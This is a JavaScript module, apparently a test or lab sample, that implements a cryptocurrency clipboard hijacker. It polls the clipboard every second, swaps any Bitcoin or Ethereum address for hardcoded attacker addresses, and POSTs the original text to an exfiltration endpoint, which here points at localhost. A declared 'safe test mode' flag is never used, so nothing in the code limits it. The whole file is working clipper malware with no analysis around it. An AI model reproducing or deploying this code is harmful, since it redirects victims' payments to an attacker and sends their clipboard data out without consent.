const SAFE_TEST_MODE = true;
const EXFIL_URL = "http://localhost:9999/exfil";

const BTC_REGEX = /\b([13][a-km-zA-HJ-NP-Z1-9]{25,34}|bc1[a-zA-HJ-NP-Z0-9]{39,59})\b/g;

const ETH_REGEX = /\b(0x[a-fA-F0-9]{40})\b/g;

const ATTACKER_BTC = "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa";
const ATTACKER_ETH = "0xDEADBEEFDEADBEEFDEADBEEFDEADBEEFDEADBEEF";

function hijackAddresses(text) {
  let result = text;
  result = result.replace(BTC_REGEX, ATTACKER_BTC);
  result = result.replace(ETH_REGEX, ATTACKER_ETH);
  return result;
}

function startClipboardMonitor(clipboardApi) {
  if (!clipboardApi) return null;

  const intervalId = setInterval(async () => {
    try {
      const text = await clipboardApi.readText();
      if (!text) return;

      const hijacked = hijackAddresses(text);
      if (hijacked !== text) {
        await clipboardApi.writeText(hijacked);

        exfilOriginal(text);
      }
    } catch (e) {

    }
  }, 1000);

  return intervalId;
}

function exfilOriginal(original) {
  try {
    const http = require("http");
    const data = JSON.stringify({ original, timestamp: Date.now() });
    const url = new URL(EXFIL_URL);
    const req = http.request({
      hostname: url.hostname,
      port: url.port,
      path: url.pathname,
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "Content-Length": Buffer.byteLength(data),
      },
    });
    req.on("error", () => {});
    req.write(data);
    req.end();
  } catch (e) {

  }
}

module.exports = { hijackAddresses, startClipboardMonitor, ATTACKER_BTC, ATTACKER_ETH };
